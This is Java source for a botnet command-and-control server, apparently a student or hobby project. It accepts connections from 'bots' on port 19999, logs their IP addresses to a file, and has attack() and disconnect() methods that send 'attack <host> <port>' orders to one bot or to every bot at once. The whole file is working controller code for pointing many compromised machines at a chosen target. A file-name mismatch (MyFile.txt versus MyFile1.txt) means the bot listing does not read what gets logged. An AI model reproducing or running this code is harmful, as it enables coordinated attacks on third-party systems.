package server;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;

public class MasterServer {

	static ServerSocket socket1;
	 protected final static int port = 19999;
	 static Socket connection;

	 static boolean first;
	 static StringBuffer process;
	 static String TimeStamp;
	 
	 static Map<String,Socket> clientSocketsMapToIp=new HashMap<String,Socket>();

	public static void main(String args[]) throws IOException{
		
				 
		 try{
		      socket1 = new ServerSocket(port);
		      System.out.println("SingleSocketServer Initialized");
		      int character;
		      
		      ThreadForCommands t=new ThreadForCommands();
		      t.start();
		      
		      while (true) {
		          connection = socket1.accept();
		          System.out.println("Client Connected");
		          
		          ThreadsForMultipleClients m=new ThreadsForMultipleClients(connection);
		          m.start();
		          
		          InetAddress addr = connection.getInetAddress();
		          String ipAddress=addr.toString().substring(1);
		          int port = connection.getPort();
		          System.out.println(port);
		          TimeStamp = new java.util.Date().toString();
		          
		          //clientSocketsMapToIp.put(ipAddress+":"+port, connection);
		          clientSocketsMapToIp.put(ipAddress, connection);
		          write(ipAddress,port,TimeStamp);
		          
		          
		          
		          //need to wait 10 seconds for the app to update database
		          /*try {
		            Thread.sleep(10000);
		          }
		          catch (Exception e){
		        	  
		          }*/
		       }
		      }
		      catch (IOException e) {
		      }
		 }
	
	public void listBots(){
		//Reading from the text file
        try{
      	FileReader reader = new FileReader("MyFile.txt");
          BufferedReader bufferedReader = new BufferedReader(reader);

          String line;

          while ((line = bufferedReader.readLine()) != null) {
              System.out.println(line);
          }
          reader.close();

      } catch (IOException e) {
          e.printStackTrace();
      }
	}
	
	public void attack(String command){
			System.out.println(command);
			String[] elements = command.split(" ");
			String ipOrAll=elements[1];
			String targetHostname=elements[2];
			String targetHostnameport=elements[3];
			String sendCommand = "attack" + " " + targetHostname + " " + targetHostnameport + " " + (char) 13;
			//When we have to use all the bots to connect to the target host
			if(command.contains("all")){
				
				//Iterating over each bot to get their socket
				Iterator iterate=clientSocketsMapToIp.entrySet().iterator();
				while(iterate.hasNext()){
					Map.Entry<String, Socket> bot=(Entry<String, Socket>)iterate.next();
					
				BufferedOutputStream osForAll;
				try {
					//Fetching socket for each bot
					osForAll = new BufferedOutputStream(bot.getValue().getOutputStream());
					OutputStreamWriter oswForAll = new OutputStreamWriter(osForAll, "US-ASCII");
					oswForAll.write(sendCommand);
					oswForAll.flush();
				} catch (IOException e) {
					e.printStackTrace();
					}
			}
				}
			
			else{
			//When we want a particular bot to connect to the target hostname
			BufferedOutputStream os;
			try {
				os = new BufferedOutputStream(clientSocketsMapToIp.get(ipOrAll).getOutputStream());
				OutputStreamWriter osw = new OutputStreamWriter(os, "US-ASCII");
				osw.write(sendCommand);
				osw.flush();
			} catch (IOException e) {
				e.printStackTrace();
				}
			}
		
		
	}
	
	public void disconnect(String command){
		
		System.out.println(command);
		String[] elements = command.split(" ");
		String ipOrAll=elements[1];
		String targetHostname=elements[2];
		String targetHostnameport=elements[3];
		String sendCommand = "disconnect" + " " + targetHostname + " " + targetHostnameport + " " + (char) 13;
	
		//When we have to use all the bots to connect to the target host
		if(command.contains("all")){
			
			//Iterating over each bot to get their socket
			Iterator iterate=clientSocketsMapToIp.entrySet().iterator();
			while(iterate.hasNext()){
				Map.Entry<String, Socket> bot=(Entry<String, Socket>)iterate.next();
				
			BufferedOutputStream osForAll;
			try {
				//Fetching socket for each bot
				osForAll = new BufferedOutputStream(bot.getValue().getOutputStream());
				OutputStreamWriter oswForAll = new OutputStreamWriter(osForAll, "US-ASCII");
				oswForAll.write(sendCommand);
				oswForAll.flush();
			} catch (IOException e) {
				e.printStackTrace();
				}
		}
			}
		
		else{
		//When we want a particular bot to connect to the target hostname
		BufferedOutputStream os;
		try {
			os = new BufferedOutputStream(clientSocketsMapToIp.get(ipOrAll).getOutputStream());
			OutputStreamWriter osw = new OutputStreamWriter(os, "US-ASCII");
			osw.write(sendCommand);
			osw.flush();
		} catch (IOException e) {
			e.printStackTrace();
			}
		}
	}
	
	public static void write(String ip, int port, String datetime){
		//Writing to the file and saving the bots IP and port
        
         try {
             FileWriter writer = new FileWriter("MyFile1.txt", true);
             BufferedWriter bufferedWriter = new BufferedWriter(writer);
  
             bufferedWriter.write(ip+" "+port+" "+datetime);
             bufferedWriter.newLine();
             bufferedWriter.close();
         } catch (IOException e) {
             e.printStackTrace();
         }
	}
	
	
		 	
	   }

